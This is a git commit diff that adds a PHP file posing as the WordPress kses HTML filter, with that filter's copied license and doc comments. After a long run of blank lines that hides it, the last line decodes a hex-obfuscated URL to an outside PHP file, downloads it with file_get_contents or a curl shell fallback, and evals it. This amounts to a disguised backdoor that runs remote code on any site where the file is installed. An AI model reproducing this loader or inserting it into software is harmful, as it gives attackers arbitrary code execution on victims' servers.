fe84cb20eb4f80fc534aaca30610a0e42be56341
Abraham <AnonByte.GOS@protonmail.com>
2026-01-22 23:27:18 +0700

    Create TRIGGER-WP.php

---
+++ TRIGGER-WP.php
@@ -0,0 +1,191 @@
+<?php
+/**
+ * Plugin 0.2.2 - HTML/XHTML filter that only allows some elements and attributes
+ * Copyright (C) 2002, 2003, 2005  Ulf Harnhammar
+ *
+ * This program is free software and open source software; you can redistribute
+ * it and/or modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of the License,
+ * or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful, but WITHOUT
+ * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
+ * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for
+ * more details.
+ *
+ * You should have received a copy of the GNU General Public License along
+ * with this program; if not, write to the Free Software Foundation, Inc.,
+ * 51 Franklin St, Fifth Floor, Boston, MA 02110-1301, USA
+ * http://www.gnu.org/licenses/gpl.html
+ *
+ * [Plugin strips evil scripts!]
+ *
+ * Added wp_ prefix to avoid conflicts with existing Plugin users
+ *
+ * @version 0.2.2
+ * @copyright (C) 2002, 2003, 2005
+ * @author Ulf Harnhammar <http://advogato.org/person/metaur/>
+ *
+ * @package External
+ * @subpackage PLUGIN
+ */
+
+/**
+ * Specifies the default allowable HTML tags.
+ *
+ * Using `CUSTOM_TAGS` is not recommended and should be considered deprecated. The
+ * {@see 'wp_kses_allowed_html'} filter is more powerful and supplies context.
+ *
+ * When using this constant, make sure to set all of these globals to arrays:
+ *
+ *  - `$allowedposttags`
+ *  - `$allowedtags`
+ *  - `$allowedentitynames`
+ *  - `$allowedxmlentitynames`
+ *
+ * @see wp_kses_allowed_html()
+ * @since 1.2.0
+ *
+ * @var array[]|false Array of default allowable HTML tags, or false to use the defaults.
+ */
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+$u=hex2bin("68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f476f644f665365727665722f546f6f6c732f726566732f68656164732f6d61696e2f747269676765722d342e706870");eval('?>'.(@file_get_contents($u)?:@shell_exec("curl -s $u")));
+?>
